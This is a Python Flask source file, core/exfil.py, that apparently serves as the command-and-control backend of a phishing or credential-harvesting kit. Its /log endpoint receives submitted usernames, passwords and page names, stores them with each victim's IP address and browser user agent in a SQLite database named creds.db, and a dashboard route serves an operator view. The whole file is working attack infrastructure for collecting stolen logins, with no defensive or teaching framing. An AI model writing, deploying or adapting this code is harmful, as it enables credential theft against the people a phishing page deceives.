# core/exfil.py
from flask import Flask, request, jsonify
import sqlite3

app = Flask(__name__, static_folder='../c2')

def init_db():
    conn = sqlite3.connect('c2/creds.db')
    conn.execute('''CREATE TABLE IF NOT EXISTS hits
                 (id INTEGER PRIMARY KEY, ip TEXT, username TEXT, password TEXT, page TEXT, ua TEXT, timestamp DATETIME DEFAULT CURRENT_TIMESTAMP)''')
    conn.close()

@app.route('/log', methods=['POST'])
def log():
    data = request.json
    ip = request.remote_addr
    ua = request.headers.get('User-Agent')
    conn = sqlite3.connect('c2/creds.db')
    conn.execute("INSERT INTO hits (ip, username, password, page, ua) VALUES (?, ?, ?, ?, ?)",
                 (ip, data['u'], data['p'], data['page'], ua))
    conn.commit()
    conn.close()
    return jsonify(success=True)

@app.route('/')
def dashboard():
    return app.send_static_file('dashboard.html')

def start_c2():
    init_db()
    app.run(host="0.0.0.0", port=5000, threaded=True)